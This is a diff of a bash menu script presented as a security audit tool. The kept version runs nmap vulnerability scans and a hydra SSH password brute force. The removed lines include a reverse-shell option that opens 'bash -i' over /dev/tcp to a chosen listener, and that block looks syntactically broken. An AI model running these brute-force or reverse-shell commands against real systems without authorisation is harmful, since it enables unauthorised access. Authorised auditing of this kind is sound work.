@@ -23,163 +23,97 @@
 # Use at your own risk.           #
 ##################################
 
-# Global Variables
+# Create a directory for results
 SCAN_DIR="audit_results_$(date +%F_%T)"
 mkdir -p "$SCAN_DIR"
 
-# Centralized Command Checker
+# Check if a command is installed
 check_command() {
-    if ! command -v "$1" &> /dev/null; then
-        echo "Error: $1 is not installed." >&2
-        return 1
-    fi
+    command -v "$1" &> /dev/null || { echo "Error: $1 is not installed."; return 1; }
 }
 
-# Function Definitions
-
+# Perform Network Scan
 perform_network_scan() {
     read -p "Enter target IP or range (e.g., 192.168.1.0/24): " target
-    if [[ -z "$target" ]]; then
-        echo "Error: No target provided." >&2
-        return 1
-    fi
-
+    [[ -z "$target" ]] && { echo "No target provided."; return 1; }
     check_command nmap || return 1
-
-    echo "Performing Network Scan on $target..."
-    nmap -sP "$target" -oN "$SCAN_DIR/network_scan.txt" &
-
-    echo "Network Scan initiated, running in background..."
+    nmap -sP "$target" -oN "$SCAN_DIR/network_scan.txt" && echo "Network scan completed."
 }
 
+# Perform Vulnerability Assessment
 perform_vulnerability_assessment() {
     read -p "Enter target IP or domain: " target
-    if [[ -z "$target" ]]; then
-        echo "Error: No target provided." >&2
-        return 1
-    fi
-
+    [[ -z "$target" ]] && { echo "No target provided."; return 1; }
     check_command nmap || return 1
-
-    echo "Performing Vulnerability Assessment on $target..."
-    nmap --script vuln "$target" -oN "$SCAN_DIR/vuln_assessment.txt"
-    echo "Vulnerability Assessment Complete."
+    nmap --script vuln "$target" -oN "$SCAN_DIR/vuln_assessment.txt" && echo "Vulnerability assessment completed."
 }
 
+# Run Compliance Check
 run_compliance_check() {
-    read -p "Enter target IP or range (e.g., 192.168.1.0/24): " target
-    if [[ -z "$target" ]]; then
-        echo "Error: No target provided." >&2
-        return 1
-    fi
-
+    read -p "Enter target IP or range: " target
+    [[ -z "$target" ]] && { echo "No target provided."; return 1; }
     check_command nmap || return 1
     check_command hydra || return 1
-
-    echo "Running Compliance Check on $target..."
     nmap -p 22 --open -sV "$target" -oN "$SCAN_DIR/ssh_compliance.txt"
     hydra -L usernames.txt -P passwords.txt ssh://"$target" -o "$SCAN_DIR/weak_passwords.txt"
-    echo "Compliance Check Complete."
+    echo "Compliance check completed."
 }
 
+# Collect System Information
 collect_system_info() {
-    echo "Gathering System Information..."
     {
         echo "Hostname: $(hostname)"
-        echo "Operating System: $(uname -o)"
-        echo "Kernel Version: $(uname -r)"
+        echo "OS: $(uname -o)"
+        echo "Kernel: $(uname -r)"
         echo "Uptime: $(uptime -p)"
-        echo "Users Currently Logged In: $(who)"
-        echo "Free Memory: $(free -h | grep Mem | awk '{print $4}')"
-        echo "Disk Usage: $(df -h | grep '/$' | awk '{print $5}')"
-        echo "Current User: $(whoami)"
-        echo "Active Processes: $(ps -eo cmd | wc -l)"
+        echo "Users: $(who)"
     } > "$SCAN_DIR/system_info.txt"
-    echo "System Information Collected."
+    echo "System information collected."
 }
 
+# Check Password Policy
 check_password_policy() {
-    echo "Checking Password Policy..."
     {
-        if [[ -f /etc/login.defs ]]; then
-            grep -E 'PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE' /etc/login.defs || echo "Password policy file not accessible."
-        else
-            echo "Password policy file does not exist."
-        fi
+        [[ -f /etc/login.defs ]] && grep -E 'PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE' /etc/login.defs || echo "No policy file found."
     } > "$SCAN_DIR/password_policy.txt"
-    echo "Password Policy Check Complete."
+    echo "Password policy checked."
 }
 
+# Check Firewall Status
 check_firewall_status() {
     check_command ufw || return 1
-
-    echo "Checking Firewall Status..."
     ufw status verbose > "$SCAN_DIR/firewall_status.txt"
-    echo "Firewall Status Check Complete."
+    echo "Firewall status checked."
 }
 
+# Generate Audit Report
 generate_audit_report() {
-    local report_file="$SCAN_DIR/audit_report.txt"
-    
-    echo "Generating Report..."
     {
-        cat "$SCAN_DIR"/*.txt
-    } > "$report_file"
-
-    echo "Report Generated: $report_file"
+        echo "=== Audit Report ==="
+        echo "Generated on: $(date)"
+        echo ""
+        for file in network_scan vuln_assessment ssh_compliance weak_passwords system_info password_policy firewall_status; do
+            echo "=== ${file//_/ } ==="
+            [[ -f "$SCAN_DIR/${file}.txt" ]] && cat "$SCAN_DIR/${file}.txt" || echo "No results found."
+            echo ""
+        done
+        echo "=== End of Report ==="
+    } > "$SCAN_DIR/audit_report.txt"
+    echo "Audit report generated: $SCAN_DIR/audit_report.txt"
 }
 
-cleanup_old_files() {
-    echo "Cleaning up old result files..."
-    find . -type d -name "audit_results_*" -mtime +7 -exec rm -r {} +
-    echo "Old files cleaned."
-}
-
-start_reverse_shell() {
-    read -p "Enter listener IP: " listener_ip
-    read -p "Enter listener port: " listener_port
-    local log_file="$SCAN_DIR/reverse_shell.log"
-
-    echo "Starting reverse shell to $listener_ip on port $listener_port..."
-    
-    {
-        # Start the reverse shell and log input and output
-        { 
-            bash -i >& /dev/tcp/"$listener_ip"/"$listener_port" 0>&1
-        } | tee "$log_file" | {
-            # Log the received data and send it back
-            while IFS= read -r line; do
-                echo "Received: $line"
-                echo "$line" >&3
-            done
-        } 3>&1 &
-
-    echo "Reverse shell initiated. Logging to $log_file."
-}
-
-cleanup_reverse_shell() {
-    echo "Cleaning up reverse shell log..."
-    rm -f "$SCAN_DIR/reverse_shell.log"
-    echo "Reverse shell log cleaned."
-}
-
-# Main Menu
+# Main Menu Loop
 while true; do
-    echo "Select an audit option:"
     echo "1. Network Scan"
     echo "2. Vulnerability Assessment"
     echo "3. Compliance Check"
     echo "4. System Information"
     echo "5. Password Policy Check"
     echo "6. Firewall Status"
-    echo "7. Generate Report"
-    echo "8. Cleanup Old Files"
-    echo "9. Start Reverse Shell"
-    echo "10. Cleanup Reverse Shell Log"
-    echo "11. Exit"
+    echo "7. Generate Audit Report"
+    echo "8. Exit"
 
-    read -p "Enter choice [1-11]: " choice
-
+    read -p "Choose an option [1-8]: " choice
     case $choice in
         1) perform_network_scan ;;
         2) perform_vulnerability_assessment ;;
@@ -188,10 +122,7 @@ while true; do
         5) check_password_policy ;;
         6) check_firewall_status ;;
         7) generate_audit_report ;;
-        8) cleanup_old_files ;;
-        9) start_reverse_shell ;;
-        10) cleanup_reverse_shell ;;
-        11) echo "Exiting..." ; exit 0 ;;
-        *) echo "Invalid choice, please try again." ;;
+        8) exit 0 ;;
+        *) echo "Invalid choice. Try again." ;;
     esac
 done
